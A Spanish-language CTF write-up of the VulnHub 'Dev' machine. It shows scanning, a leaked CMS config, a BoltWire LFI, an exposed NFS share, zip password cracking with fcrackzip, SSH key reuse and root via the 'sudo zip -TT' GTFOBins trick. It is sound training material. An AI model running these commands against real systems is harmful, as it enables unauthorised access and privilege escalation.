---
title: "DEV - VulnHub CTF Writeup"
description: "CTF maquina dev, una reto que convina tanto exploitacion web a traves de LFI como servicio NFS, filtración de ficheros importantes y mala configuración de servicios"
pubDate: 2025-08-31
heroImage: "/img/dev.png"
---

### Introducción



En este write-up se documenta la explotación de la máquina **Dev (VulnHub)**.  

El objetivo principal fue practicar técnicas de reconocimiento, enumeración y escalada de privilegios en un entorno controlado. Durante el proceso se identificaron servicios mal configurados (NFS expuesto), credenciales sensibles reutilizables y configuraciones inseguras de sudo, que permitieron obtener acceso root.  Este ejercicio refleja escenarios comunes en entornos reales donde la falta de controles básicos abre la puerta a ataques críticos.



En primer lugar empezamos lanzando un escaneo usando la herramienta de NMAP, la cual nos puede ayudar a saber que puertos hay expuestos en el servidor y que servicios tiene cada uno de ellos.



```bash

nmap -T4 -p- -A 192.168.107.144

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-30 11:40 CDT

Nmap scan report for 192.168.107.144

Host is up (0.00098s latency).

Not shown: 65526 closed tcp ports (reset)

PORT      STATE SERVICE  VERSION

22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

| ssh-hostkey: 

|   2048 bd:96:ec:08:2f:b1:ea:06:ca:fc:46:8a:7e:8a:e3:55 (RSA)

|   256 56:32:3b:9f:48:2d:e0:7e:1b:df:20:f8:03:60:56:5e (ECDSA)

|_  256 95:dd:20:ee:6f:01:b6:e1:43:2e:3c:f4:38:03:5b:36 (ED25519)

80/tcp    open  http     Apache httpd 2.4.38 ((Debian))

|_http-server-header: Apache/2.4.38 (Debian)

|_http-title: Bolt - Installation error

111/tcp   open  rpcbind  2-4 (RPC #100000)

| rpcinfo: 

|   program version    port/proto  service

|   100000  2,3,4        111/tcp   rpcbind

|   100000  2,3,4        111/udp   rpcbind

|   100000  3,4          111/tcp6  rpcbind

|   100000  3,4          111/udp6  rpcbind

|   100003  3           2049/udp   nfs

|   100003  3           2049/udp6  nfs

|   100003  3,4         2049/tcp   nfs

|   100003  3,4         2049/tcp6  nfs

|   100005  1,2,3      32811/tcp6  mountd

|   100005  1,2,3      41417/udp   mountd

|   100005  1,2,3      48933/tcp   mountd

|   100005  1,2,3      49969/udp6  mountd

|   100021  1,3,4      35213/tcp   nlockmgr

|   100021  1,3,4      37034/udp   nlockmgr

|   100021  1,3,4      38769/tcp6  nlockmgr

|   100021  1,3,4      56920/udp6  nlockmgr

|   100227  3           2049/tcp   nfs_acl

|   100227  3           2049/tcp6  nfs_acl

|   100227  3           2049/udp   nfs_acl

|_  100227  3           2049/udp6  nfs_acl

2049/tcp  open  nfs      3-4 (RPC #100003)

8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))

|_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()

|_http-server-header: Apache/2.4.38 (Debian)

| http-open-proxy: Potentially OPEN proxy.

|_Methods supported:CONNECTION

```



Estamos delante de un sistema el cual tiene los puertos comunes web el puerto comun para http 80 y otro por el puerto 8080 que tambien pertence a http, un puerto 22 que corresponde con el ssh y asi mas relevantes el puerto 111 el cual seria rpcbind y puerto 2049 con nfs el cual podria ser de la existencia de algun servicio nfs dentro del servidor.



Pasaremos a visualizar la pagina web.



<p align="center">
  <img src="/img/dev/dev-1.png" alt="http-80" width="80%">
</p>



Vemos que nos muestra un error de instalación  del cms Bolt, y parecer ser un error del cual  el sitio esta en otra ubicación. Probamos a usar el puerto 8080.



<p align="center">
  <img src="/img/dev/dev-2.png" alt="http-8080" width="80%">
</p>



Vemos que se trata de una pagina por defecto de php la cual se encarga de mostrar Información  sobre el servidor, no recomendable para entornos de producción  ya que expone Información n real sobre el servidor. Ahora ya que no vemos mucho vamos a indagar mas y hacer un poco de fuzzing para ver si encontramos el CMS Bolt.



Aquí vemos que hay como carpetas de alguna aplicación web.



```bash

gobuster dir --url http://192.168.107.144 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

===============================================================

Gobuster v3.6

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

===============================================================

[+] Url:                     http://192.168.107.144

[+] Method:                  GET

[+] Threads:                 10

[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

[+] Negative Status codes:   404

[+] User Agent:              gobuster/3.6

[+] Timeout:                 10s

===============================================================

Starting gobuster in directory enumeration mode

===============================================================

/public               (Status: 301) [Size: 319] [--> http://192.168.107.144/public/]

/src                  (Status: 301) [Size: 316] [--> http://192.168.107.144/src/]

/app                  (Status: 301) [Size: 316] [--> http://192.168.107.144/app/]

/vendor               (Status: 301) [Size: 319] [--> http://192.168.107.144/vendor/]

/extensions           (Status: 301) [Size: 323] [--> http://192.168.107.144/extensions/]

/server-status        (Status: 403) [Size: 280]

Progress: 220560 / 220561 (100.00%)

===============================================================

Finished

===============================================================

```



```bash

gobuster dir --url http://192.168.107.144:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

===============================================================

Gobuster v3.6

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

===============================================================

[+] Url:                     http://192.168.107.144:8080

[+] Method:                  GET

[+] Threads:                 10

[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

[+] Negative Status codes:   404

[+] User Agent:              gobuster/3.6

[+] Timeout:                 10s

===============================================================

Starting gobuster in directory enumeration mode

===============================================================

/dev                  (Status: 301) [Size: 323] [--> http://192.168.107.144:8080/dev/]

/server-status        (Status: 403) [Size: 282]

Progress: 220560 / 220561 (100.00%)

===============================================================

Finished

===============================================================

```



Aquí ya lo que encontró  usando el puerto 8080 el cual vamos a acceder ahora ya que el anterior tiene que ser algún  tipo de index y este puede ya ser el sitio web bolt.



<p align="center">
  <img src="/img/dev/dev-3.png" alt="Boltwire1" width="80%">
</p>



De acuerdo aquí ya tenemos el sitio y parece ser un Boltwire, y debajo de welcome podemos ver que hay para hacer login y puede que en el primer fuzzing el del puerto 80 hemos visto carpetas de este CMS accedemos a la que dice app para ver si tal vez vemos algún fichero con contraseña y usuario.



<p align="center">
  <img src="/img/dev/dev-4.png" alt="http-index" width="80%">
</p>



Aquí se nos descarga un fichero config.yml, accedemos a el y vemos unos credenciales

<p align="center">
  <img src="/img/dev/dev-5.png" alt="configyml" width="80%">
</p>



Hay una contraseña tratamos de acceder con esos creedenciales



<p align="center">
  <img src="/img/dev/dev-6.png" alt="login" width="80%">
</p>



Resultado incorrecto así  que vamos a probar a registrarnos.



<p align="center">
  <img src="/img/dev/dev-7.png" alt="registro" width="80%">
</p>



Registro correcto y ahora ya estamos dentro de la web con un usuario, ahora exploramos la web y vemos que hay una sección de buscar la cual puede haber algún fallo de LFI, asi que procedemos a buscar boltwire en Exploitdb.





<p align="center">
  <img src="/img/dev/dev-8.png" alt="exploitdb" width="80%">
</p>



Existe vulnerabilidad, se trata al usar el cuadro de busqueda, así que procedemos a probar.



<p align="center">
  <img src="/img/dev/dev-9.png" alt="vuln1" width="80%">
</p>



Pero no surge efecto ya que si nos fijamos bien en la url vemos search&query y en el ejemplo de **exploitdb** podemos ver que decir search&action, podemos cambiar ese query por un action y nos mostrara el resultado.



<p align="center">
  <img src="/img/dev/dev-10.png" alt="vuln2" width="80%">
</p>



Ahora el siguiente paso sera aquí podemos ver que existe un usuario jeanpaul, y ahora podemos probar a hacer fuerza bruta ssh, o intentar acceder con reverse shell, pero antes si recordamos al principio vimos que había un servidor nfs podemos acceder para ver si existe alguna filtración de contraseña o algo para obtener acceso a mediante ese usuario.



```bash

showmount -e 192.168.107.144

Export list for 192.168.107.144:

/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16

```



Existe, un directorio de red el cual podemos proceder a montar en /mnt/dev



```bash

sudo mkdir /mnt/dev



sudo mount -t nfs 192.168.107.144:/srv/nfs /mnt/dev



❯ ls -l /mnt/dev

total 4

-rw-r--r-- 1 nobody nogroup 1911 Aug 29 06:07 save.zip

```



Tras montarlo vemos que hay un fichero zip con el nombre de save tal vez puede ser algun backup o documento importante, nos lo traemos a nuestra maquina y procedemos a descifrar.

``` bash

sudo cp /mnt/dev/save.zip .                                                                           

ls

config.yml  ports-dev.txt  save.zip



unzip save.zip

Archive:  save.zip

[save.zip] id_rsa password: 

   skipping: id_rsa                  incorrect password

   skipping: todo.txt                incorrect password

```





De acuerdo, nos pide contraseña para extraer, asi que como no la sabemos procedemos a usar fuerza bruta, para ello usamos la herramienta **fcrackzip**.



``` bash

 fcrackzip -v -u -D -p  /usr/share/wordlists/rockyou.txt save.zip

found file 'id_rsa', (size cp/uc   1435/  1876, flags 9, chk 2a0d)

found file 'todo.txt', (size cp/uc    138/   164, flags 9, chk 2aa1)





PASSWORD FOUND!!!!: pw == java101

```



y ya sabiendo la contraseña  procedemos a extraer el zip, el cual podemos ver que tenemos dos ficheros todo.txt y un id_rsa que por lo visto sera el del usuario visto antes.



```bash

unzip save.zip

Archive:  save.zip

[save.zip] id_rsa password: 

  inflating: id_rsa                  

  inflating: todo.txt

```



Fichero todo.txt



```bash

cat todo.txt

- Figure out how to install the main website properly, the config file seems correct...

- Update development website

- Keep coding in Java because it's awesome



jp

```



Nos dice un poco de info sobre el sitio y sobre java que es divertido. accedemos por ssh usando el id_rsa con el usuario jp o jeanpaul.



```bash

chmod 600 id_rsa



❯ ssh -i id_rsa jeanpaul@192.168.107.144

Enter passphrase for key 'id_rsa': 

jeanpaul@192.168.107.144's password: 

Permission denied, please try again.

jeanpaul@192.168.107.144's password: 

Permission denied, please try again.

jeanpaul@192.168.107.144's password: 

jeanpaul@192.168.107.144: Permission denied (publickey,password).

```



Aquí nos pide un passpharase para el id_rsa, es decir que el fichero esta protegido con contraseña, del cual podemos hacer fuerza bruta pero si recordamos el fichero todo.txt firmado por jp o jeanpaul y el le gusta el lenguaje java y la contraseña que vimos en el fichero config.yml tal vez sea la misma que la del id_rsa ya que la primera fila de ese fichero todo.txt nombra el config file, así  que probamos la contraseña de la base de datos.



<p align="center">
  <img src="/img/dev/dev-11.png" alt="buscarpassword" width="80%">
</p>



Probas a acceder con ssh probando ese password



```bash

ssh -i id_rsa jeanpaul@192.168.107.144

Enter passphrase for key 'id_rsa': 

Linux dev 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64



The programs included with the Debian GNU/Linux system are free software;

the exact distribution terms for each program are described in the

individual files in /usr/share/doc/*/copyright.



Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent

permitted by applicable law.

Last login: Fri Aug 29 07:22:35 2025 from 192.168.107.131

jeanpaul@dev:~$ id

uid=1000(jeanpaul) gid=1000(jeanpaul) groups=1000(jeanpaul),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)

jeanpaul@dev:~$ whoami

jeanpaul

jeanpaul@dev:~$ ^C

jeanpaul@dev:~$ 

```



Ahora ya estamos dentro, vamos a buscar una forma de conseguir acceso a root, podemos probar con sudo -l, permisos SUID o alguna tarea cron.



```bash

 /home/jeanpaul

jeanpaul@dev:~$ ls

jeanpaul@dev:~$ ls -la

total 28

drwxr-xr-x 3 jeanpaul jeanpaul 4096 Jun  2  2021 .

drwxr-xr-x 3 root     root     4096 Jun  1  2021 ..

-rw------- 1 jeanpaul jeanpaul  219 Aug 29 07:27 .bash_history

-rw-r--r-- 1 jeanpaul jeanpaul  220 Jun  1  2021 .bash_logout

-rw-r--r-- 1 jeanpaul jeanpaul 3526 Jun  1  2021 .bashrc

-rw-r--r-- 1 jeanpaul jeanpaul  807 Jun  1  2021 .profile

drwx------ 2 jeanpaul jeanpaul 4096 Jun  2  2021 .ssh

jeanpaul@dev:~$ sudo -l

Matching Defaults entries for jeanpaul on dev:

    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin



User jeanpaul may run the following commands on dev:

    (root) NOPASSWD: /usr/bin/zip

jeanpaul@dev:~$ 

```



Podemos ver que tenemos permisos de root para ejecutar el binario zip, el cual si vamos a la pagina de gfobins, buscamos zip sudo, tal vez podamos ver como obtener una shell con root.



<p align="center">
  <img src="/img/dev/dev-12.png" alt="gfobins" width="80%">
</p>



Ahora lo que tenemos que hacer es probar esos comandos.



```bash

jeanpaul@dev:~$ TF=$(mktemp -u)

jeanpaul@dev:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'

  adding: etc/hosts (deflated 31%)

id

uid=0(root) gid=0(root) groups=0(root)

# whoami

root

ls

cd /root

ls

flag.txt

# cat flag.txt

Congratz on rooting this box !

# 

```



Y ya tendríamos este reto resuelto.

## Conclusión

La explotación de **Dev (VulnHub)** demuestra cómo errores de configuración aparentemente simples pueden comprometer por completo un sistema.  

---

### 🔑 Puntos clave identificados
- NFS mal configurado permitió la filtración de claves SSH.  
- Archivos de configuración de CMS accesibles.  
- Uso inseguro de `sudo` con binarios vulnerables (`zip`).  

---

### 📌 Lecciones aprendidas
- Limitar y segmentar los servicios expuestos en la red.  
- Proteger archivos sensibles y restringir permisos innecesarios.  
- Revisar periódicamente las políticas de `sudo` para evitar escaladas triviales.  